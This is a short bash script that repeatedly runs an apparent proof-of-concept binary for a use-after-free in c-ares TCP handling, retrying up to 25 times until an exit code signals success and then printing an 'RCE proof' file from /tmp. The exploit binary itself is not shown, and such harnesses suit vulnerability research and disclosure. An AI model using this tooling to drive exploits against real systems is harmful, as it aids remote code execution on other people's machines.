#!/usr/bin/env bash
set -euo pipefail

bin=${1:-./cares_tcp_uaf_calc_poc}
tries=${TRIES:-25}

rm -f /tmp/cares_rce_proof_*

for i in $(seq 1 "$tries"); do
  set +e
  "$bin" controlcall
  rc=$?
  set -e
  echo "run=$i rc=$rc"
  if [ "$rc" -eq 77 ]; then
    break
  fi
done

cat /tmp/cares_rce_proof_latest 2>/dev/null || true
